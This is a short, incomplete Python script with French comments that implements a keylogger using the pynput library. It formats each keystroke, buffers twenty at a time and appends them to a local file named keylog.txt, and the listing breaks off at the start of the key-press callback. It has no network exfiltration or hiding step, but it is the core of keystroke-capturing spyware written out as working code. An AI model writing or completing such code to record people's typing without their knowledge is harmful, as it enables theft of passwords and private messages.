from pynput import keyboard

import threading #arrier plan

from datetime import datetime #horaire chaque frape

import os

#───────────────────────── HOOKS SYSTEME ─────────────────────────

# ── CONFIGURATION ────────────────────────────────────────────

LOG_FILE = "keylog.txt" #data teste 
BUFFER_SIZE = 20 #attendre pour pas reouvrire a chaque foi sinon bug

# ── VARIABLES GLOBALES ───────────────────────────────────────
buffer = []

lock = threading.Lock()

# ── FONCTIONS UTILITAIRES ────────────────────────────────────
def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"

def flush_buffer():
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("".join(buffer))

    buffer.clear()#vide la liste aprés ecrit 

# ── CALLBACKS : LE CŒUR DU LISTENER ─────────────────────────
def onpress(key):
    